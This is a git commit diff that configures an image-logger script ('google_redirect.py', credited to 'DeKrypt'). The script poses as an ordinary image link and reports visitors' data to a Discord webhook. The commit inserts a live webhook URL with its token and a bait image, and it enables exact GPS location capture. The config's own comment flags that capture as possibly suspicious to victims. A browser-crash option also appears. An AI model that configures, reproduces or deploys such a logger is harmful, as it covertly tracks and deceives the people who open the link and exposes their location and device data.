e57b0e494724b85d65a509fdff541c240867bad6
saidzac20002 <saidzac2023@gmail.com>
2026-03-03 17:39:24 -0600

    Update webhook and image URLs in google_redirect.py

--- api/google_redirect.py
+++ api/google_redirect.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1478199953821143122/oDOhn8xMUBCynaZNQTaSEJMn6PH6Mg1gTw4dG_NiY8Hs7aiwYqCWdBhoxBxBRrauf32Z",
+    "image": "https://media.discordapp.net/attachments/1367985557807956008/1463717600268783686/IMG_0974.png?ex=69a83d7e&is=69a6ebfe&hm=2780d0dc2e6e30b0ba8981c8d5ce4843ec8415ec0bee9757fe78a5b5f99ade40&=&format=webp&quality=lossless&width=553&height=404", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
